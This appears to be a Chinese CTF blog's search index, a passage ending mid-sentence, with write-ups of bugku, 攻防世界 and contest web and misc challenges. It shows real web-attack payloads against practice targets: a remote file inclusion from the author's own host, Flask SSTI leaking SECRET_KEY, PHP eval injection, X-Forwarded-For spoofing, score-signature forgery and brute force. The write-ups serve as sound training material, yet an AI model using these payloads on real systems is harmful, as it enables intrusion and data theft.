<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Tips</title>
    <link href="/2023/05/18/Tips/"/>
    <url>/2023/05/18/Tips/</url>
    
    <content type="html"><![CDATA[<p>1.在进行文件包含时，不一定非要包含目标主机的文件，也可以包含自己电脑上的文件，举个例子：</p><p>先在本地创建一个网站，名字随便，这里起名test.com，端口81，文件包含的文件名是1.php，内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>本地被包含的文件名为1.txt，内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后看一下自己的ip，这里是192.168.120.1</p><p><strong>划重点，这里我的ip是vmnet1（仅主机）下的ip，如果想复现的话别搞错ip</strong></p><p>包含的url：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">120.132</span><span class="hljs-regexp">/1.php?file=http:/</span><span class="hljs-regexp">/192.168.120.1:81/</span><span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>依然能看到服务器的phpinfo()信息。</p>]]></content>
    
    
    
    <tags>
      
      <tag>远程文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugkuweb</title>
    <link href="/2023/05/05/bugkuweb/"/>
    <url>/2023/05/05/bugkuweb/</url>
    
    <content type="html"><![CDATA[<h3 id="1-滑稽"><a href="#1-滑稽" class="headerlink" title="1.滑稽"></a>1.滑稽</h3><p>F12查看即可，又是考视力&#x3D; &#x3D;</p><p><img src="%E6%BB%91%E7%A8%BD.png" alt="滑稽"></p><hr><h3 id="2-计算器"><a href="#2-计算器" class="headerlink" title="2.计算器"></a>2.计算器</h3><p>小学算数，答案是111，但是输入1之后就输入不进去了，直接改前端代码</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A8.png" alt="计算器"></p><p>把maxlength删了或者把1改大一点就行了，提交</p><hr><h3 id="3-GET"><a href="#3-GET" class="headerlink" title="3.GET"></a>3.GET</h3><p><img src="GET1.png" alt="GET"></p><p>简单的代码审计，直接GET传参</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">what</span>=flag<br></code></pre></td></tr></table></figure><p><img src="GET2.png" alt="GET2"></p><hr><h3 id="4-Simple-SSTI-1"><a href="#4-Simple-SSTI-1" class="headerlink" title="4.Simple_SSTI_1"></a>4.Simple_SSTI_1</h3><p>页面提示我需要绕过一个叫flag的参数，然后F12说：你知道，在烧瓶里，我们经常设置一个secret_key变量。 </p><p>![Simple_SSTI_1.1]Simple_SSTI_1.1.png)</p><p>flask的模板注入：（注意：这里的SECRET_KEY需要大写）</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">？flag=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.SECRET_KEY</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="Simple_SSTI_1.2.png" alt="Simple_SSTI_1.2"></p><p>flask使用jinjia2渲染引擎进行网页渲染，当处理不得当，未进行语句过滤，用户输入，会导致渲染出恶意代码，形成注入</p><p>注：SSTI 就是服务器端模板注入（Server-Side Template  Injection）当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web  应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">详见</a></p><hr><h3 id="5-POST"><a href="#5-POST" class="headerlink" title="5.POST"></a>5.POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$what</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;what&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$what</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$what</span>==<span class="hljs-string">&#x27;flag&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;****&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>比较简单，post方式提交what变量即可：</p><p><img src="POST.png" alt="POST"></p><p>提交就得到flag</p><hr><h3 id="6-矛盾"><a href="#6-矛盾" class="headerlink" title="6.矛盾"></a>6.矛盾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET方式获得num，先判断num不是数字，然后num还要等于1，才输出flag</p><p>想了一下，写出以下payload：num&#x3D;1 and 1</p><p>以此类推就是条件判断就行了，写num&#x3D;1 and 1or 1这种也行，交上去就有flag了</p><hr><h3 id="7-alert"><a href="#7-alert" class="headerlink" title="7.alert"></a>7.alert</h3><p>进入场景是一个弹窗，写着flag就在这：</p><p><img src="alert1.png" alt="alert1"></p><p>F12或者ctrl+u看见一串编码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#103;</span><span class="hljs-symbol">&amp;#123;</span><span class="hljs-symbol">&amp;#51;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#57;</span><span class="hljs-symbol">&amp;#48;</span><span class="hljs-symbol">&amp;#55;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#57;</span><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#51;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#100;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#48;</span><span class="hljs-symbol">&amp;#98;</span><span class="hljs-symbol">&amp;#125;</span><br></code></pre></td></tr></table></figure><p>直接放burp里Smart decode，html解密就得到flag：</p><p><img src="alert2.png" alt="alert2"></p><hr><h3 id="8-你必须让他停下"><a href="#8-你必须让他停下" class="headerlink" title="8.你必须让他停下"></a>8.你必须让他停下</h3><p>进入页面，两行字：</p><p><strong>I want to play Dummy game with others£¡But I can’t stop!</strong> </p><p>Stop at panda ! u will get flag</p><p>我想到的是，burp直接拦呗，放到repeater模块一直send：</p><p><img src="%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B1.png" alt="你必须让他停下1"></p><p>这里每次刷新得到的的页面都不同，故返回页面也不一样，10.jpg是flag所在的包。</p><hr><h3 id="9-头等舱"><a href="#9-头等舱" class="headerlink" title="9.头等舱"></a>9.头等舱</h3><p>啥也没有，F12，ctrl+u都没有，抓个包看看：</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B1.png" alt="头等舱"></p><p>我一想，既然包里有，那F12网络一栏应该也有，这里是肯定的，这里就不演示了。</p><hr><h3 id="10-eval"><a href="#10-eval" class="headerlink" title="10.eval"></a>10.eval</h3><p>页面给出了代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先学习一下：<strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p>file() 函数把整个文件读入一个数组中。</p><p>命令执行嘛，先看看全局变量。构造?hello&#x3D;$GLOBALS</p><p><img src="eval1.png" alt="eval1"></p><p>没看见有flag相关的变量，那应该在文件里，构造?hello&#x3D;file(‘flag.php’)</p><p><img src="eval2.png" alt="eval2"></p><hr><h3 id="11-网站被黑"><a href="#11-网站被黑" class="headerlink" title="11.网站被黑"></a>11.网站被黑</h3><p>题目描述：网站被黑了，黑客会不会留下后门                            </p><p>看样子是提示我们找后门，那就御剑扫一波，发现index.php和shell.php</p><p>访问index.php和之前没啥区别，看看shell.php：</p><p><img src="%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91.png" alt="网站被黑1"></p><p>应该是后门密码，万能密码试了一下，不行，页面提示<strong>不是自己的马不要乱骑！</strong></p><p>还挺有意思，直接burp暴破，字典里的密码都不对，在网上看了一下wp，密码是hack</p><p>然后就拿到flag了</p><hr><h3 id="12-本地管理员"><a href="#12-本地管理员" class="headerlink" title="12.本地管理员"></a>12.本地管理员</h3><p>打开页面是这样的：</p><p><img src="%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%981.png" alt="本地管理员1"></p><p>试试弱口令，页面回显是“**IP禁止访问，请联系本地管理员登陆，IP已被记录.**”</p><p>看样子要改ip：X-Forwarded-For:127.0.0.1</p><p>发过去之后提示：<strong>Invalid credentials! Please try again!</strong></p><p>应该是密码错了，F12看一下，发现了一串字符，应该是base64编码</p><p><img src="%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%982.png" alt="本地管理员2"></p><p> dGVzdDEyMw&#x3D;&#x3D; </p><p>burp解码一下：是test123，这应该是密码，提交试试</p><p><img src="%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%983.png" alt="本地管理员3"></p><hr><h3 id="13-变量1"><a href="#13-变量1" class="headerlink" title="13.变量1"></a>13.变量1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">flag In the variable ! <br><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123; <span class="hljs-comment">// // 这个正则表达式的意思是匹配任意 [A-Za-z0-9_] 的字符，就是任意大小写字母和0到9以及下划线组成</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先学一下：</p><p>isset()函数用于检测变量是否已设置并且非 NULL。</p><p>prep_match: 用于执行一个正则表达式匹配。</p><p>error_reporting(0)关闭错误显示。</p><p>还是老规矩，先看看全局变量，虽然不让传’$’,但是在var_dump()函数中给出了‘$’，还是挺有意思的：</p><p><img src="%E5%8F%98%E9%87%8F1.png" alt="变量1"></p><hr><h3 id="14-Simple-SSTI-2"><a href="#14-Simple-SSTI-2" class="headerlink" title="14.Simple_SSTI_2"></a>14.Simple_SSTI_2</h3><hr><h3 id="15-Flask-FileUpload"><a href="#15-Flask-FileUpload" class="headerlink" title="15.Flask_FileUpload"></a>15.Flask_FileUpload</h3><hr><h3 id="16-game1"><a href="#16-game1" class="headerlink" title="16.game1"></a>16.game1</h3><p>让我玩游戏，先玩两把<del>摸个鱼</del>，然后看了看源码，没啥收获，直接在游戏结束时抓包，修改score的值，但是即使我改的了很高的分数，依然是失败</p><p><img src="game11.png" alt="game1"></p><p>那就没这么简单了，看了一下大佬的wp,给出的思路是：说明有其他的参数来验证分数的真实性；这个参数可能是 sign或者可能在 cookie里。</p><p><img src="game12.png" alt="game2"></p><p>很明显，当分数不同时不同的包差距在于 score和 sign</p><p>对比sign发现 sign是由 zM + xxx + &#x3D;&#x3D; 构成</p><p>zM是很好看出来的，等号那有点难看，那好办，去base64解码看看就知道了，MjU&#x3D;解密出来是25，MjU&#x3D;&#x3D;出来是25&#x3D;，所以后面俩等号是固定的</p><p>那就好办了，把分数和sign同时改高就行了，这里我改成9999：</p><p><img src="game13.png" alt="game3"></p><p>这里我还试了一下单改sign，发现不行，说明两个参数是同时校验的。</p><p>做完之后突然想到能不能用intruder同时暴破两个地方，答案是肯定的，我写了个脚本，给出了300-1000之间的数字，然后为了实验成功，我在最后加了9999，intruder选择Pitchfork模式，Payload Sets选择Custom iterator，在Payload Processing选择Add，选base64加密，也能成功：</p><p><img src="game14.png" alt="game14"></p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1.游戏类的一般都是通过修改分数来的，要嘛改高（999999) ,要嘛改低（-999999) </p><p>2.控制分数的参数可能不止一个，如果有加密的就得尝试解密。一般就多试几次，找到因分数不同而改变的参数，然后对该参数进行分析</p><hr><h3 id="17-bp"><a href="#17-bp" class="headerlink" title="17.bp"></a>17.bp</h3><p>提示:密码top1000？z?????</p><p>TOP1000的字典跑一下，没区别</p><p><img src="bp1.png" alt="bp1"></p><p>发现每个包都有一段js代码，这时需要用到Intruder中的Grep-Match功能：该功能可以帮我们分析Response中是否含有给定字符串。</p><p>Intruder模块Ootions，打开Grep-Extract</p><p>Add一条code: ‘bugku10000’</p><p><img src="bp2.png" alt="bp2"></p><p>zxc123应该就是密码了，登录即可。</p><hr><h3 id="18-社工-伪造"><a href="#18-社工-伪造" class="headerlink" title="18.社工-伪造"></a>18.社工-伪造</h3><p>一进来是这种</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A01.png" alt="社工-伪造1"></p><p>皮一下</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A02.png" alt="社工-伪造2"></p><p>不知道干啥，看看空间</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A03.png" alt="社工-伪造3"></p><p>说只有他男朋友在qq空间问他，他才能交出flag，试试暴破一下，我猜如果是他男朋友的号，包会有所不同，试了一下，速度太慢，然后server error了，看下面评论说要登自己qq，试了一下</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A04.png" alt="社工-伪造4"></p><p>还真是，然后把自己的QQ昵称改成他男朋友的：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A05.png" alt="社工-伪造5"></p><p>不愧是社工的题，我的评价是，<del>我还是脑洞不够大</del>，我还是不够BT，没想到把昵称改了。</p><hr><h3 id="19-社工-初步收集"><a href="#19-社工-初步收集" class="headerlink" title="19.社工-初步收集"></a>19.社工-初步收集</h3><p>点下载辅助，下载了个exe文件，被拦了，说可能损坏电脑，仍要运行就行：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%861.png" alt="社工-初步收集1"></p><p>这里的话，涉及一个知识点就是遇到这种开挂的软件或者别的软件时，我们可以查看流量的走向。</p><p>打开wireshark，监听wlan，然后再开始刷</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%862.png" alt="社工-初步收集2"></p><p>也算是考眼力吧，拿到账号密码了以为到此结束了，没想到不对，看着像base64编码，解码看看</p><p><a href="mailto:&#x62;&#117;&#x67;&#x6b;&#117;&#x6b;&#117;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#109;">&#x62;&#117;&#x67;&#x6b;&#117;&#x6b;&#117;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#109;</a></p><p>XSLROCPMNWWZQDZL</p><p>怪不得有bugku@163的流量包，去网易邮箱看看，但是账号密码登录失败了，这里还有一个知识点：邮箱登录的方式，主流是两种，一种是密码登录，一种是授权码登录，官网提供的邮箱登录一般是账号+密码登录，第三方邮件系统登录的一般都是客户端+授权码登录。<br>很显然，我们解出来的那串base64不是密码，那么应该就是授权码了，网上wp是用foxmail，还有用QQ邮箱手机版的，都成功登录了，找到了一个邮件：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%863.png" alt="社工-初步收集3"></p><p>有账号密码，御剑扫后台发现了登陆界面：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%864.png" alt="社工-初步收集4"></p><p>去登录就行了。</p><hr>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>bugku</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度3</title>
    <link href="/2023/04/27/web03/"/>
    <url>/2023/04/27/web03/</url>
    
    <content type="html"><![CDATA[<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p>先试了一下万能密码，没成，然后用bp跑了一下字典，也没成功，想到robots.txt，发现Disallow：&#x2F;user.php.bak</p><p><img src="fakebook1.png" alt="fakebook1"></p><p>访问后下载了网页源码</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度1</title>
    <link href="/2023/04/22/misc01/"/>
    <url>/2023/04/22/misc01/</url>
    
    <content type="html"><![CDATA[<h2 id="记两道润天杯校赛的题"><a href="#记两道润天杯校赛的题" class="headerlink" title="记两道润天杯校赛的题"></a>记两道润天杯校赛的题</h2><h3 id="1-misc-1"><a href="#1-misc-1" class="headerlink" title="1.misc_1"></a>1.misc_1</h3><p>解压之后是一张图片，用01editor打开，由于是jpg图片，直接搜FFD9</p><p><img src="misc_1.1.png" alt="misc_1.1"></p><p>看见后面有pk，得知是zip，直接另存为zip，打开就拿到flag了</p><hr><h3 id="2-misc-2"><a href="#2-misc-2" class="headerlink" title="2. misc_2"></a>2. misc_2</h3><p>打开图片属性，看到这：</p><p><img src="misc_2.png" alt="misc_2"></p><p>社会主义核心价值观加密，直接复制版权信息解密两次就行了，<a href="http://www.atoolbox.net/Tool.php?Id=850">在线工具</a></p><p><strong>在这里感谢x2658y大佬给讲题~</strong></p><hr><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="1-Banmabanma"><a href="#1-Banmabanma" class="headerlink" title="1.Banmabanma"></a>1.Banmabanma</h3><p>一张图，先记事本打开，没收获，就去stegsolve看了一下，用手机扫也没结果，不知道是不是我的问题&#x3D; &#x3D;，ida也是一无所获</p><p>最后去网上看wp，发现了一个叫条形码在线阅读的网站 <a href="https://online-barcode-reader.inliteresearch.com/">Barcode Reader. Free Online Web Application</a></p><p>把图片放进去就拿到flag了</p><p><img src="Banmabanma.png" alt="Banmabanma"></p><hr><h3 id="2-适合作为桌面"><a href="#2-适合作为桌面" class="headerlink" title="2.适合作为桌面"></a>2.适合作为桌面</h3><p>先从简单的入手，记事本打开，没找到flag，然后用stegsolve打开，找到了一个二维码：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A21.png" alt="适合作为桌面1"></p><p>还是去上一题提到的那个网站扫一下二维码看看：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A22.png" alt="适合作为桌面2"></p><p>（stegsolve换图层的过程中我发现有的二维码是扫不了的）</p><p>得到了一串16进制的数字</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">03</span>F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E0100000<span class="hljs-number">07300000000</span><br></code></pre></td></tr></table></figure><p>03F30D0A是pyc文件</p><p><strong>pyc文件</strong>：是由Python文件经过编译后所生成的文件，众所周知Python的运行性能不如编译性语言(比如C语言)，所以Python在程序执行结束后会把字节码写入到硬盘中，保存为.pyc文件，目的是下一次再执行python xxx.py程序时，Python会先在目录下找xxx.pyc文件来执行</p><p>01editor打开如下：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A23.png" alt="适合作为桌面3"></p><p><strong>依然在这里感谢x2658y</strong>，要不然我还傻了吧唧写成txt，正确做法应该是放到01editor另存为pyc文件</p><p>然后去反编译：</p><p><a href="https://tool.lu/pyc/">python反编译在线工具</a></p><p>得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 2.7</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-built_in">str</span> = [<br>        <span class="hljs-number">102</span>,<br>        <span class="hljs-number">108</span>,<br>        <span class="hljs-number">97</span>,<br>        <span class="hljs-number">103</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">97</span>,<br>        <span class="hljs-number">53</span>,<br>        <span class="hljs-number">55</span>,<br>        <span class="hljs-number">48</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">50</span>,<br>        <span class="hljs-number">48</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">53</span>,<br>        <span class="hljs-number">52</span>,<br>        <span class="hljs-number">52</span>,<br>        <span class="hljs-number">49</span>,<br>        <span class="hljs-number">101</span>,<br>        <span class="hljs-number">55</span>,<br>        <span class="hljs-number">125</span>]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        flag += <span class="hljs-built_in">chr</span>(i)<br>    <br>    <span class="hljs-built_in">print</span> flag<br>flag() //反编译没这一行，我们需要调用flag()<br></code></pre></td></tr></table></figure><p>注释提到是python2.7，所以直接去<a href="https://c.runoob.com/compile/6/">在线编译</a></p><p>这里flag()要顶格，我不知道为什么，<del>但我大为震撼</del></p><p>最后得到了flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">38</span>a57032085441e7&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-心仪的公司"><a href="#3-心仪的公司" class="headerlink" title="3.心仪的公司"></a>3.心仪的公司</h3><p>这道题是wireshark的包，借此机会学习一下wireshark的<a href="https://blog.csdn.net/yeyiqun/article/details/99310715">颜色规则</a></p><p>这个流量包叫webshell，故在显示过滤器中输入：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span><span class="hljs-string">&quot;webshell&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B81.png" alt="心仪的公司1"></p><p>追踪TCP流，找到flag</p><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B82.png" alt="心仪的公司2"></p><p>还有一种方法，在kali里输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings webshell.pcapng <span class="hljs-string">| grep &quot;</span>&#123;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><strong>命令的意思是在webshell这个包里过滤含有”{“的字符串，然后输出</strong></p><p>这里我是照着大佬们的wp写的，但是我这里输出了很多行，所以我改一下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings webshell.pcapng <span class="hljs-string">| grep &quot;</span>fl4g<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B83.png" alt="心仪的公司3"></p><p><del>这里有点面向结果了</del>，正常解的话应该是先grep”flag“，可以看到没收获，这时可以试试fl4g</p><p><strong>strings命令</strong> 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。</p><p><strong>管道符</strong>：|</p><p><strong>作用</strong>：管道是一种通信机制，通常用于进程间的通信。它表现出来的形式将前面每一个进程的输出（stdout）直接作为下一个进程的输入</p><p>ls &#x2F; | grep “y“</p><p>grep 指令用于“过滤”<br>grep 语法：grep 选项 文件路径&#x2F;内容</p><p>针对上面这个命令说明：<br>① 